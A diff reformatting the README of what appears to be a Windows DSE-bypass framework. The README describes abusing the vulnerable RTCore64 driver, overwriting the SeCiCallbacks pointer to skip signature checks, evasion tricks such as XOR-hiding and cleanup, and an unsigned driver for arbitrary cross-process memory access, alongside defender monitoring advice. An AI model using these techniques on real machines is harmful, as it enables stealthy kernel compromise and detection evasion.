@@ -696,7 +696,6 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
     return STATUS_SUCCESS;
 }
 ```
-
 **Why This Driver?**
 
 1. **Legitimate Signature** - Loads without DSE bypass (chicken-and-egg problem solved)
@@ -712,23 +711,45 @@ NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGL
 ✅ **IOCTL codes** 0x80002048/0x8000204C are fingerprints  
 
 ❌ **String obfuscation** hides driver name in static analysis  
-❌ **XOR encryption** changes resource hash (embedded binaryWContinue≠ original driver hash)
-❌ Temporary extraction to system.evtx evades filename-based detection
-❌ Automatic cleanup removes all traces after operations
+❌ **XOR encryption** changes resource hash (embedded binary ≠ original driver hash)  
+❌ **Temporary extraction** to `system.evtx` evades filename-based detection  
+❌ **Automatic cleanup** removes all traces after operations  
 
-6: OmniDriver & OmniUtility (Demonstration Payload)
+**Mitigation by Defenders:**
+```powershell
+# Monitor for device creation (requires kernel driver/ETW)
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Kernel-PnP/Device Configuration'; ID=400} |
+    Where-Object { $_.Message -match 'RTCore64' }
+
+# Block vulnerable driver loading via WDAC/AppLocker
+# Driver hash: [original RTCore64.sys hash]
+# Note: Won't catch XOR-encrypted embedded version
+
+# Monitor IOCTL operations (behavioral detection)
+# Look for 0x80002048/0x8000204C to \Device\RTCore64
+
+# File system monitoring
+# Alert on: C:\Windows\system.evtx creation (non-standard event log location)
+```
+
+---
+
+### Component 6: OmniDriver & OmniUtility (Demonstration Payload)
+
 With DSE bypassed, the framework can load unsigned kernel drivers. OmniDriver serves as a demonstration payload showcasing production-grade kernel memory operations.
-OmniDriver.sys - Unsigned kernel driver with safe cross-process memory access.
-Safety Features:
 
-Process Context Switching: Uses KeStackAttachProcess() for safe address space switching
-Structured Exception Handling: __try/__except blocks prevent BSOD from invalid memory access
-Memory Probing: ProbeForRead/ProbeForWrite validate addresses before operations
-Intermediate Buffering: Never performs direct cross-process copies (allocates non-paged buffer)
-Proper Resource Cleanup: Guaranteed cleanup even during exceptions
+**OmniDriver.sys** - Unsigned kernel driver with safe cross-process memory access.
 
-IOCTL Interface:
-c#define IOCTL_READWRITE_DRIVER_READ  0x80000800  // CTL_CODE custom
+**Safety Features:**
+- **Process Context Switching**: Uses `KeStackAttachProcess()` for safe address space switching
+- **Structured Exception Handling**: `__try/__except` blocks prevent BSOD from invalid memory access
+- **Memory Probing**: `ProbeForRead`/`ProbeForWrite` validate addresses before operations
+- **Intermediate Buffering**: Never performs direct cross-process copies (allocates non-paged buffer)
+- **Proper Resource Cleanup**: Guaranteed cleanup even during exceptions
+
+**IOCTL Interface:**
+```c
+#define IOCTL_READWRITE_DRIVER_READ  0x80000800  // CTL_CODE custom
 #define IOCTL_READWRITE_DRIVER_WRITE 0x80000804  // CTL_CODE custom
 
 typedef struct _READWRITE_REQUEST {
@@ -739,22 +760,25 @@ typedef struct _READWRITE_REQUEST {
     BOOLEAN Write;        // FALSE=read, TRUE=write
     NTSTATUS Status;      // Operation result (output)
 } READWRITE_REQUEST;
-OmniUtility.exe - Demonstration application showcasing kernel capabilities:
-Features:
+```
 
-Universal Window Title Modification - Changes all visible window titles simultaneously
-Direct Text Injection - Injects text into Notepad buffers (clipboard + kernel write methods)
-Module Base Finder - Enumerates all loaded modules in any process with base addresses
-Cross-Process Memory Operations - Read/write arbitrary process memory via kernel driver
+**OmniUtility.exe** - Demonstration application showcasing kernel capabilities:
 
-Example Usage:
-cmd# Load OmniDriver via BootBypass (AutoPatch=YES in drivers.ini)
+**Features:**
+1. **Universal Window Title Modification** - Changes all visible window titles simultaneously
+2. **Direct Text Injection** - Injects text into Notepad buffers (clipboard + kernel write methods)
+3. **Module Base Finder** - Enumerates all loaded modules in any process with base addresses
+4. **Cross-Process Memory Operations** - Read/write arbitrary process memory via kernel driver
+
+**Example Usage:**
+```cmd
+# Load OmniDriver via BootBypass (AutoPatch=YES in drivers.ini)
 # OR manually after DSE bypass:
-cmd# sc create OmniDriver binPath= C:\Windows\System32\drivers\OmniDriver.sys type= kernel
-cmd# sc start OmniDriver
+sc create OmniDriver binPath= C:\Windows\System32\drivers\OmniDriver.sys type= kernel
+sc start OmniDriver
 
 # Launch demonstration tool
-cmd# OmniUtility.exe
+OmniUtility.exe
 
 Menu:
 [1] Modify all window titles (demonstrates kernel-level window manipulation)
@@ -810,24 +834,25 @@ New Value      = 0xFFFFF8000069C1B0 (ZwFlushInstructionCache)
 
 Performed via:
   WriteMemory64(hDriver, callbackToPatch, safeFunction, IOCTL_WRITE)
-Consequences:
+```
 
-Signature validation skipped (callback never invokes validation logic)
-All driver loads return STATUS_SUCCESS
-CI state flags remain unchanged (g_CiEnabled still TRUE)
-No event logs generated (validation "passes")
-Stealth: appears as legitimate CI operation to security tools
+**Consequences:**
+- Signature validation skipped (callback never invokes validation logic)
+- All driver loads return `STATUS_SUCCESS`
+- CI state flags remain unchanged (`g_CiEnabled` still TRUE)
+- No event logs generated (validation "passes")
+- Stealth: appears as legitimate CI operation to security tools
 
-Why This Works:
+**Why This Works:**
+- Single function pointer modified (not kernel code)
+- `SeCiCallbacks` table not protected by PatchGuard (data, not code)
+- `ZwFlushInstructionCache` has identical calling convention
+- Always returns success regardless of input
+- System stability maintained (no crashes or corruption)
 
-Single function pointer modified (not kernel code)
-SeCiCallbacks table not protected by PatchGuard (data, not code)
-ZwFlushInstructionCache has identical calling convention
-Always returns success regardless of input
-System stability maintained (no crashes or corruption)
-
-Kernel Structures (Simplified):
-c// ntoskrnl.exe internal structures (not documented, reverse-engineered)
+**Kernel Structures (Simplified):**
+```c
+// ntoskrnl.exe internal structures (not documented, reverse-engineered)
 
 typedef NTSTATUS (*PCI_VALIDATE_IMAGE_HEADER)(
     PVOID ImageBase,
@@ -873,22 +898,24 @@ NTSTATUS ZwFlushInstructionCache(
     // Flush CPU instruction cache (no-op on x64 with strong memory ordering)
     return STATUS_SUCCESS;  // ALWAYS succeeds
 }
-Detection Bypass:
-Traditional DSE bypass detection looks for:
+```
 
-g_CiEnabled flag modification - This technique doesn't touch it
-g_CiOptions modification - This technique doesn't touch it
-Kernel code patching - This technique only modifies data (function pointer)
+**Detection Bypass:**
+
+Traditional DSE bypass detection looks for:
+1. **`g_CiEnabled` flag modification** - This technique doesn't touch it
+2. **`g_CiOptions` modification** - This technique doesn't touch it
+3. **Kernel code patching** - This technique only modifies data (function pointer)
 
 What defenders should monitor:
+1. **`SeCiCallbacks` structure integrity** - callback pointer validation
+2. **Suspicious driver loads** - unsigned drivers appearing after boot
+3. **Vulnerable driver presence** - detect RTCore64/other known vulnerable drivers
+4. **IOCTL operations** - monitor 0x80002048/0x8000204C to suspicious devices
 
-SeCiCallbacks structure integrity - callback pointer validation
-Suspicious driver loads - unsigned drivers appearing after boot
-Vulnerable driver presence - detect RTCore64/other known vulnerable drivers
-IOCTL operations - monitor 0x80002048/0x8000204C to suspicious devices
+---
 
-
-🚀 Quick Start
+## 🚀 Quick Start
 Prerequisites
 Required:
 
